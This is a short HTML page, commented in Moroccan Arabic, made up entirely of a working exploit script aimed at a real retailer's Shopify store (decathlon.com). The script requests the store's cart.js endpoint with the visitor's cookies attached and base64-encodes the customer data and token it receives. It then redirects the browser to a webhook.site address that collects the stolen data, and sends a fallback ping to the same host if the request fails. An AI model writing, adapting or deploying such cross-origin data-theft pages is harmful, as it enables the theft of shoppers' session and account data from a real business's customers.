<!DOCTYPE html>
<html>
<body>
    <script>
        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";

        // غانطلبو الصفحة اللي فيها معلومات الكليان (Shopify Client Info)
        // السيرفر غايصيفطها حيت المتصفح غايزيد الكوكيز أوتوماتيكيا
        fetch('https://www.decathlon.com/cart.js', {credentials: 'include'})
        .then(response => response.json())
        .then(data => {
            // هنا غانجبدو الـ Token ديال Shopify اللي كيكون وسط الـ JSON
            var leak = btoa(JSON.stringify(data));
            window.location.href = webhook + "?shopify_leak=" + leak;
        })
        .catch(err => {
            // إلا فشلات، غانصيفطو غير الداتا اللي مسموح بيها
            window.location.href = webhook + "?debug=CORS_Limited";
        });
    </script>
</body>
</html>
